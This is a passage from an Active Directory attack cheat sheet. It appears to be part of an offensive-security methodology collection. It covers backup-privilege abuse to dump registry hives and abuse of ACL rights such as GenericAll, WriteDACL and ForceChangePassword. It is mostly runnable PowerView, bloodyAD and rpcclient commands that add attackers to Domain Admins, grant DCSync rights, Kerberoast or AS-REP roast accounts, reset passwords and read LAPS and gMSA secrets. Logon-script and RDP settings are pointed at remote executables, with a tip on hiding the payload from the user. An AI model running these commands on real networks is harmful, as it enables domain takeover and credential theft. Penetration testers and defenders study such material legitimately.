<a id="__codelineno-237-2" name="__codelineno-237-2" href="#__codelineno-237-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-237-3" name="__codelineno-237-3" href="#__codelineno-237-3"></a>
<a id="__codelineno-237-4" name="__codelineno-237-4" href="#__codelineno-237-4"></a><span class="nb">Set-SeBackupPrivilege</span>
<a id="__codelineno-237-5" name="__codelineno-237-5" href="#__codelineno-237-5"></a><span class="nb">Get-SeBackupPrivilege</span>
</code></pre></div></li>
<li>Retrieve sensitive files
  <div class="highlight"><pre><span></span><code><a id="__codelineno-238-1" name="__codelineno-238-1" href="#__codelineno-238-1"></a><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Overwrite</span>
</code></pre></div></li>
<li>Retrieve content of AutoLogon in the HKLM\SOFTWARE hive
  <div class="highlight"><pre><span></span><code><a id="__codelineno-239-1" name="__codelineno-239-1" href="#__codelineno-239-1"></a><span class="nv">$reg</span> <span class="p">=</span> <span class="no">[Microsoft.Win32.RegistryKey]</span><span class="p">::</span><span class="n">OpenRemoteBaseKey</span><span class="p">(</span><span class="s1">&#39;LocalMachine&#39;</span><span class="p">,</span> <span class="s1">&#39;dc.htb.local&#39;</span><span class="p">,</span><span class="no">[Microsoft.Win32.RegistryView]</span><span class="p">::</span><span class="n">Registry64</span><span class="p">)</span>
<a id="__codelineno-239-2" name="__codelineno-239-2" href="#__codelineno-239-2"></a><span class="nv">$winlogon</span> <span class="p">=</span> <span class="nv">$reg</span><span class="p">.</span><span class="n">OpenSubKey</span><span class="p">(</span><span class="s1">&#39;SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#39;</span><span class="p">)</span>
<a id="__codelineno-239-3" name="__codelineno-239-3" href="#__codelineno-239-3"></a><span class="nv">$winlogon</span><span class="p">.</span><span class="n">GetValueNames</span><span class="p">()</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span><span class="s2">&quot;$_ : </span><span class="p">$((</span><span class="nv">$winlogon</span><span class="p">).</span><span class="n">GetValue</span><span class="p">(</span><span class="nv">$_</span><span class="p">))</span><span class="s2">&quot;</span><span class="p">}</span>
</code></pre></div></li>
<li>Retrieve SAM,SECURITY and SYSTEM hives</li>
<li><a href="https://github.com/mpgn/BackupOperatorToDA">mpgn/BackupOperatorToDA</a>: <code>.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\</code></li>
<li><a href="https://github.com/improsec/BackupOperatorToolkit">improsec/BackupOperatorToolkit</a>: <code>.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK</code></li>
</ul>
<h2 id="abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</h2>
<p>Check ACL for an User with <a href="https://github.com/canix1/ADACLScanner">ADACLScanner</a>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-240-1" name="__codelineno-240-1" href="#__codelineno-240-1"></a><span class="n">ADACLScan</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Base</span> <span class="s2">&quot;DC=contoso;DC=com&quot;</span> <span class="n">-Filter</span> <span class="s2">&quot;(&amp;(AdminCount=1))&quot;</span> <span class="n">-Scope</span> <span class="n">subtree</span> <span class="n">-EffectiveRightsPrincipal</span> <span class="n">User1</span> <span class="n">-Output</span> <span class="n">HTML</span> <span class="n">-Show</span>
</code></pre></div>
<h3 id="genericall">GenericAll</h3>
<ul>
<li><strong>GenericAll on User</strong> : We can reset user's password without knowing the current password</li>
<li>
<p><strong>GenericAll on Group</strong> : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group : </p>
<ul>
<li>On Windows : <code>net group "domain admins" hacker /add /domain</code></li>
<li>On Linux:<ul>
<li>using the Samba software suite : 
<code>net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]</code></li>
<li>using bloodyAD: 
<code>bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>GenericAll/GenericWrite</strong> : We can set a <strong>SPN</strong> on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
  <div class="highlight"><pre><span></span><code><a id="__codelineno-241-1" name="__codelineno-241-1" href="#__codelineno-241-1"></a><span class="c"># Check for interesting permissions on accounts:</span>
<a id="__codelineno-241-2" name="__codelineno-241-2" href="#__codelineno-241-2"></a><span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentinyReferenceName</span> <span class="o">-match</span> <span class="s2">&quot;RDPUsers&quot;</span><span class="p">}</span>
<a id="__codelineno-241-3" name="__codelineno-241-3" href="#__codelineno-241-3"></a>
<a id="__codelineno-241-4" name="__codelineno-241-4" href="#__codelineno-241-4"></a><span class="c"># Check if current user has already an SPN setted:</span>
<a id="__codelineno-241-5" name="__codelineno-241-5" href="#__codelineno-241-5"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">serviceprincipalname</span>
<a id="__codelineno-241-6" name="__codelineno-241-6" href="#__codelineno-241-6"></a>
<a id="__codelineno-241-7" name="__codelineno-241-7" href="#__codelineno-241-7"></a><span class="c"># Force set the SPN on the account: Targeted Kerberoasting</span>
<a id="__codelineno-241-8" name="__codelineno-241-8" href="#__codelineno-241-8"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Set-DomainObject</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-Set</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;ops/whatever1&#39;</span><span class="p">}</span>
<a id="__codelineno-241-9" name="__codelineno-241-9" href="#__codelineno-241-9"></a><span class="n">PowerView3</span> <span class="p">&gt;</span> <span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-Set</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;any/thing&#39;</span><span class="p">}</span>
<a id="__codelineno-241-10" name="__codelineno-241-10" href="#__codelineno-241-10"></a>
<a id="__codelineno-241-11" name="__codelineno-241-11" href="#__codelineno-241-11"></a><span class="c"># Grab the ticket</span>
<a id="__codelineno-241-12" name="__codelineno-241-12" href="#__codelineno-241-12"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nv">$User</span> <span class="p">=</span> <span class="nb">Get-DomainUser</span> <span class="n">username</span> 
<a id="__codelineno-241-13" name="__codelineno-241-13" href="#__codelineno-241-13"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nv">$User</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span> <span class="p">|</span> <span class="nb">fl</span>
<a id="__codelineno-241-14" name="__codelineno-241-14" href="#__codelineno-241-14"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nv">$User</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">serviceprincipalname</span>
<a id="__codelineno-241-15" name="__codelineno-241-15" href="#__codelineno-241-15"></a>
<a id="__codelineno-241-16" name="__codelineno-241-16" href="#__codelineno-241-16"></a><span class="c"># Remove the SPN</span>
<a id="__codelineno-241-17" name="__codelineno-241-17" href="#__codelineno-241-17"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">username</span> <span class="n">-Clear</span> <span class="n">serviceprincipalname</span>
</code></pre></div></p>
</li>
<li>
<p><strong>GenericAll/GenericWrite</strong> : We can change a victim's <strong>userAccountControl</strong> to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.</p>
<ul>
<li>On Windows:
<div class="highlight"><pre><span></span><code><a id="__codelineno-242-1" name="__codelineno-242-1" href="#__codelineno-242-1"></a><span class="c"># Modify the userAccountControl</span>
<a id="__codelineno-242-2" name="__codelineno-242-2" href="#__codelineno-242-2"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="n">username</span> <span class="p">|</span> <span class="nb">ConvertFrom-UACValue</span>
<a id="__codelineno-242-3" name="__codelineno-242-3" href="#__codelineno-242-3"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">username</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
<a id="__codelineno-242-4" name="__codelineno-242-4" href="#__codelineno-242-4"></a>
<a id="__codelineno-242-5" name="__codelineno-242-5" href="#__codelineno-242-5"></a><span class="c"># Grab the ticket</span>
<a id="__codelineno-242-6" name="__codelineno-242-6" href="#__codelineno-242-6"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="n">username</span> <span class="p">|</span> <span class="nb">ConvertFrom-UACValue</span>
<a id="__codelineno-242-7" name="__codelineno-242-7" href="#__codelineno-242-7"></a><span class="n">ASREPRoast</span> <span class="p">&gt;</span> <span class="nb">Get-ASREPHash</span> <span class="n">-Domain</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-UserName</span> <span class="n">username</span>
<a id="__codelineno-242-8" name="__codelineno-242-8" href="#__codelineno-242-8"></a>
<a id="__codelineno-242-9" name="__codelineno-242-9" href="#__codelineno-242-9"></a><span class="c"># Set back the userAccountControl</span>
<a id="__codelineno-242-10" name="__codelineno-242-10" href="#__codelineno-242-10"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">username</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
<a id="__codelineno-242-11" name="__codelineno-242-11" href="#__codelineno-242-11"></a><span class="n">PowerView2</span> <span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="n">username</span> <span class="p">|</span> <span class="nb">ConvertFrom-UACValue</span>
</code></pre></div></li>
<li>On Linux:
<div class="highlight"><pre><span></span><code><a id="__codelineno-243-1" name="__codelineno-243-1" href="#__codelineno-243-1"></a><span class="c1"># Modify the userAccountControl</span>
<a id="__codelineno-243-2" name="__codelineno-243-2" href="#__codelineno-243-2"></a>$<span class="w"> </span>bloodyAD.py<span class="w"> </span>--host<span class="w"> </span><span class="o">[</span>DC<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span><span class="o">[</span>DOMAIN<span class="o">]</span><span class="w"> </span>-u<span class="w"> </span><span class="o">[</span>AttackerUser<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>MyPassword<span class="o">]</span><span class="w"> </span>setUserAccountControl<span class="w"> </span><span class="o">[</span>Target_User<span class="o">]</span><span class="w"> </span>0x400000<span class="w"> </span>True
<a id="__codelineno-243-3" name="__codelineno-243-3" href="#__codelineno-243-3"></a>
<a id="__codelineno-243-4" name="__codelineno-243-4" href="#__codelineno-243-4"></a><span class="c1"># Grab the ticket</span>
<a id="__codelineno-243-5" name="__codelineno-243-5" href="#__codelineno-243-5"></a>$<span class="w"> </span>GetNPUsers.py<span class="w"> </span>DOMAIN/target_user<span class="w"> </span>-format<span class="w"> </span>&lt;AS_REP_responses_format<span class="w"> </span><span class="o">[</span>hashcat<span class="w"> </span><span class="p">|</span><span class="w"> </span>john<span class="o">]</span>&gt;<span class="w"> </span>-outputfile<span class="w"> </span>&lt;output_AS_REP_responses_file&gt;
<a id="__codelineno-243-6" name="__codelineno-243-6" href="#__codelineno-243-6"></a>
<a id="__codelineno-243-7" name="__codelineno-243-7" href="#__codelineno-243-7"></a><span class="c1"># Set back the userAccountControl</span>
<a id="__codelineno-243-8" name="__codelineno-243-8" href="#__codelineno-243-8"></a>$<span class="w"> </span>bloodyAD.py<span class="w"> </span>--host<span class="w"> </span><span class="o">[</span>DC<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span><span class="o">[</span>DOMAIN<span class="o">]</span><span class="w"> </span>-u<span class="w"> </span><span class="o">[</span>AttackerUser<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>MyPassword<span class="o">]</span><span class="w"> </span>setUserAccountControl<span class="w"> </span><span class="o">[</span>Target_User<span class="o">]</span><span class="w"> </span>0x400000<span class="w"> </span>False
</code></pre></div></li>
</ul>
</li>
</ul>
<h3 id="genericwrite">GenericWrite</h3>
<ul>
<li>
<p>Reset another user's password</p>
<ul>
<li>On Windows:
    <div class="highlight"><pre><span></span><code><a id="__codelineno-244-1" name="__codelineno-244-1" href="#__codelineno-244-1"></a><span class="c"># https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1</span>
<a id="__codelineno-244-2" name="__codelineno-244-2" href="#__codelineno-244-2"></a><span class="nv">$user</span> <span class="p">=</span> <span class="s1">&#39;DOMAIN\user1&#39;</span><span class="p">;</span> 
<a id="__codelineno-244-3" name="__codelineno-244-3" href="#__codelineno-244-3"></a><span class="nv">$pass</span><span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;user1pwd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> 
<a id="__codelineno-244-4" name="__codelineno-244-4" href="#__codelineno-244-4"></a><span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">;</span>
<a id="__codelineno-244-5" name="__codelineno-244-5" href="#__codelineno-244-5"></a><span class="nv">$newpass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;newsecretpass&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> 
<a id="__codelineno-244-6" name="__codelineno-244-6" href="#__codelineno-244-6"></a><span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="s1">&#39;DOMAIN\user2&#39;</span> <span class="n">-AccountPassword</span> <span class="nv">$newpass</span> <span class="n">-Credential</span> <span class="nv">$creds</span><span class="p">;</span>
</code></pre></div></li>
<li>On Linux:
    <div class="highlight"><pre><span></span><code><a id="__codelineno-245-1" name="__codelineno-245-1" href="#__codelineno-245-1"></a><span class="c1"># Using rpcclient from the  Samba software suite</span>
<a id="__codelineno-245-2" name="__codelineno-245-2" href="#__codelineno-245-2"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;attacker_user%my_password&#39;</span><span class="w"> </span>-W<span class="w"> </span>DOMAIN<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;setuserinfo2 target_user 23 target_newpwd&quot;</span><span class="w"> </span>
<a id="__codelineno-245-3" name="__codelineno-245-3" href="#__codelineno-245-3"></a>
<a id="__codelineno-245-4" name="__codelineno-245-4" href="#__codelineno-245-4"></a><span class="c1"># Using bloodyAD with pass-the-hash</span>
<a id="__codelineno-245-5" name="__codelineno-245-5" href="#__codelineno-245-5"></a>bloodyAD.py<span class="w"> </span>--host<span class="w"> </span><span class="o">[</span>DC<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-u<span class="w"> </span>attacker_user<span class="w"> </span>-p<span class="w"> </span>:B4B9B02E6F09A9BD760F388B67351E2B<span class="w"> </span>changePassword<span class="w"> </span>target_user<span class="w"> </span>target_newpwd
</code></pre></div></li>
</ul>
</li>
<li>
<p>WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : <code>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1</code></p>
</li>
</ul>
<h4 id="genericwrite-and-remote-connection-manager">GenericWrite and Remote Connection Manager</h4>
<blockquote>
<p>Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.</p>
<p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/</p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-246-1" name="__codelineno-246-1" href="#__codelineno-246-1"></a><span class="nv">$UserObject</span> <span class="p">=</span> <span class="p">(</span><span class="no">[ADSI]</span><span class="p">(</span><span class="s2">&quot;LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld&quot;</span><span class="p">))</span>
<a id="__codelineno-246-2" name="__codelineno-246-2" href="#__codelineno-246-2"></a><span class="nv">$UserObject</span><span class="p">.</span><span class="n">TerminalServicesInitialProgram</span> <span class="p">=</span> <span class="s2">&quot;\\1.2.3.4\share\file.exe&quot;</span>
<a id="__codelineno-246-3" name="__codelineno-246-3" href="#__codelineno-246-3"></a><span class="nv">$UserObject</span><span class="p">.</span><span class="n">TerminalServicesWorkDirectory</span> <span class="p">=</span> <span class="s2">&quot;C:\&quot;</span>
<a id="__codelineno-246-4" name="__codelineno-246-4" href="#__codelineno-246-4"></a><span class="nv">$UserObject</span><span class="p">.</span><span class="n">SetInfo</span><span class="p">()</span>
</code></pre></div>
<p>NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.</p>
<h3 id="writedacl">WriteDACL</h3>
<p>To abuse <code>WriteDacl</code> to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. <a href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a> is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : <code>./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'</code></p>
<ul>
<li>
<p>WriteDACL on Domain:</p>
<ul>
<li>On Windows: 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-247-1" name="__codelineno-247-1" href="#__codelineno-247-1"></a><span class="c"># Give DCSync right to the principal identity</span>
<a id="__codelineno-247-2" name="__codelineno-247-2" href="#__codelineno-247-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-247-3" name="__codelineno-247-3" href="#__codelineno-247-3"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;user1pwd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-247-4" name="__codelineno-247-4" href="#__codelineno-247-4"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;DOMAIN.LOCAL\user1&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
<a id="__codelineno-247-5" name="__codelineno-247-5" href="#__codelineno-247-5"></a><span class="nb">Add-DomainObjectAcl</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-TargetIdentity</span> <span class="s1">&#39;DC=domain,DC=local&#39;</span> <span class="n">-Rights</span> <span class="n">DCSync</span> <span class="n">-PrincipalIdentity</span> <span class="n">user2</span> <span class="n">-Verbose</span> <span class="n">-Domain</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> 
</code></pre></div></li>
<li>On Linux:
<div class="highlight"><pre><span></span><code><a id="__codelineno-248-1" name="__codelineno-248-1" href="#__codelineno-248-1"></a><span class="c1"># Give DCSync right to the principal identity</span>
<a id="__codelineno-248-2" name="__codelineno-248-2" href="#__codelineno-248-2"></a>bloodyAD.py<span class="w"> </span>--host<span class="w"> </span><span class="o">[</span>DC<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-u<span class="w"> </span>attacker_user<span class="w"> </span>-p<span class="w"> </span>:B4B9B02E6F09A9BD760F388B67351E2B<span class="w"> </span>setDCSync<span class="w"> </span>user2
<a id="__codelineno-248-3" name="__codelineno-248-3" href="#__codelineno-248-3"></a>
<a id="__codelineno-248-4" name="__codelineno-248-4" href="#__codelineno-248-4"></a><span class="c1"># Remove right after DCSync</span>
<a id="__codelineno-248-5" name="__codelineno-248-5" href="#__codelineno-248-5"></a>bloodyAD.py<span class="w"> </span>--host<span class="w"> </span><span class="o">[</span>DC<span class="w"> </span>IP<span class="o">]</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-u<span class="w"> </span>attacker_user<span class="w"> </span>-p<span class="w"> </span>:B4B9B02E6F09A9BD760F388B67351E2B<span class="w"> </span>setDCSync<span class="w"> </span>user2<span class="w"> </span>False
</code></pre></div></li>
</ul>
</li>
<li>
<p>WriteDACL on Group
  <div class="highlight"><pre><span></span><code><a id="__codelineno-249-1" name="__codelineno-249-1" href="#__codelineno-249-1"></a><span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s2">&quot;INTERESTING_GROUP&quot;</span> <span class="n">-Rights</span> <span class="n">WriteMembers</span> <span class="n">-PrincipalIdentity</span> <span class="n">User1</span>
<a id="__codelineno-249-2" name="__codelineno-249-2" href="#__codelineno-249-2"></a><span class="n">net</span> <span class="nb">group </span><span class="s2">&quot;INTERESTING_GROUP&quot;</span> <span class="n">User1</span> <span class="p">/</span><span class="n">add</span> <span class="p">/</span><span class="n">domain</span>
</code></pre></div>
  Or<br />
  ```powershell
  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp</p>
</li>
</ul>
<p># Remove right
  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False
    ```</p>
<h3 id="writeowner">WriteOwner</h3>
<p>An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-250-1" name="__codelineno-250-1" href="#__codelineno-250-1"></a><span class="nb">Set-DomainObjectOwner</span> <span class="n">-Identity</span> <span class="s1">&#39;target_object&#39;</span> <span class="n">-OwnerIdentity</span> <span class="s1">&#39;controlled_principal&#39;</span>
</code></pre></div>
Or<br />
<div class="highlight"><pre><span></span><code><a id="__codelineno-251-1" name="__codelineno-251-1" href="#__codelineno-251-1"></a><span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-host</span> <span class="n">my</span><span class="p">.</span><span class="n">dc</span><span class="p">.</span><span class="n">corp</span> <span class="n">-d</span> <span class="n">corp</span> <span class="n">-u</span> <span class="n">devil_user1</span> <span class="n">-p</span> <span class="n">P</span><span class="nv">@ssword123</span> <span class="n">setOwner</span> <span class="n">devil_user1</span> <span class="n">target_object</span>
</code></pre></div></p>
<p>This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.</p>
<h3 id="readlapspassword">ReadLAPSPassword</h3>
<p>An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the <a href="#reading-laps-password">Reading LAPS Password</a> section.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-252-1" name="__codelineno-252-1" href="#__codelineno-252-1"></a><span class="nb">Get-ADComputer</span> <span class="n">-filter</span> <span class="p">{</span><span class="n">ms-mcs-admpwdexpirationtime</span> <span class="o">-like</span> <span class="s1">&#39;*&#39;</span><span class="p">}</span> <span class="n">-prop</span> <span class="s1">&#39;ms-mcs-admpwd&#39;</span><span class="p">,</span><span class="s1">&#39;ms-mcs-admpwdexpirationtime&#39;</span>
</code></pre></div>
Or for a given computer<br />
<div class="highlight"><pre><span></span><code><a id="__codelineno-253-1" name="__codelineno-253-1" href="#__codelineno-253-1"></a><span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">john</span><span class="p">.</span><span class="n">doe</span> <span class="n">-d</span> <span class="n">bloody</span> <span class="n">-p</span> <span class="n">Password512</span> <span class="p">-</span><span class="n">-host</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">2</span> <span class="n">getObjectAttributes</span> <span class="n">LAPS_PC</span><span class="p">$</span> <span class="n">ms-mcs-admpwd</span><span class="p">,</span><span class="n">ms-mcs-admpwdexpirationtime</span>
</code></pre></div></p>
<h3 id="readgmsapassword">ReadGMSAPassword</h3>
<p>An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-254-1" name="__codelineno-254-1" href="#__codelineno-254-1"></a><span class="c"># Save the blob to a variable</span>
<a id="__codelineno-254-2" name="__codelineno-254-2" href="#__codelineno-254-2"></a><span class="nv">$gmsa</span> <span class="p">=</span> <span class="nb">Get-ADServiceAccount</span> <span class="n">-Identity</span> <span class="s1">&#39;SQL_HQ_Primary&#39;</span> <span class="n">-Properties</span> <span class="s1">&#39;msDS-ManagedPassword&#39;</span>
<a id="__codelineno-254-3" name="__codelineno-254-3" href="#__codelineno-254-3"></a><span class="nv">$mp</span> <span class="p">=</span> <span class="nv">$gmsa</span><span class="p">.</span><span class="s1">&#39;msDS-ManagedPassword&#39;</span>
<a id="__codelineno-254-4" name="__codelineno-254-4" href="#__codelineno-254-4"></a>
<a id="__codelineno-254-5" name="__codelineno-254-5" href="#__codelineno-254-5"></a><span class="c"># Decode the data structure using the DSInternals module</span>
<a id="__codelineno-254-6" name="__codelineno-254-6" href="#__codelineno-254-6"></a><span class="nb">ConvertFrom-ADManagedPasswordBlob</span> <span class="nv">$mp</span>
</code></pre></div>
Or<br />
<div class="highlight"><pre><span></span><code><a id="__codelineno-255-1" name="__codelineno-255-1" href="#__codelineno-255-1"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">john</span><span class="p">.</span><span class="n">doe</span> <span class="n">-d</span> <span class="n">bloody</span> <span class="n">-p</span> <span class="n">Password512</span> <span class="p">-</span><span class="n">-host</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">2</span> <span class="n">getObjectAttributes</span> <span class="n">gmsaAccount</span><span class="p">$</span> <span class="n">msDS-ManagedPassword</span>
</code></pre></div></p>
<h3 id="forcechangepassword">ForceChangePassword</h3>
<p>An attacker can change the password of the user this ACE applies to:
* On Windows, this can be achieved with <code>Set-DomainUserPassword</code> (PowerView module):
<div class="highlight"><pre><span></span><code><a id="__codelineno-256-1" name="__codelineno-256-1" href="#__codelineno-256-1"></a><span class="nv">$NewPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Password123!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<a id="__codelineno-256-2" name="__codelineno-256-2" href="#__codelineno-256-2"></a><span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="s1">&#39;TargetUser&#39;</span> <span class="n">-AccountPassword</span> <span class="nv">$NewPassword</span>
</code></pre></div></p>
<ul>
<li>On Linux:
<div class="highlight"><pre><span></span><code><a id="__codelineno-257-1" name="__codelineno-257-1" href="#__codelineno-257-1"></a><span class="c1"># Using rpcclient from the  Samba software suite</span>
<a id="__codelineno-257-2" name="__codelineno-257-2" href="#__codelineno-257-2"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;attacker_user%my_password&#39;</span><span class="w"> </span>-W<span class="w"> </span>DOMAIN<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;setuserinfo2 target_user 23 target_newpwd&quot;</span><span class="w"> </span>
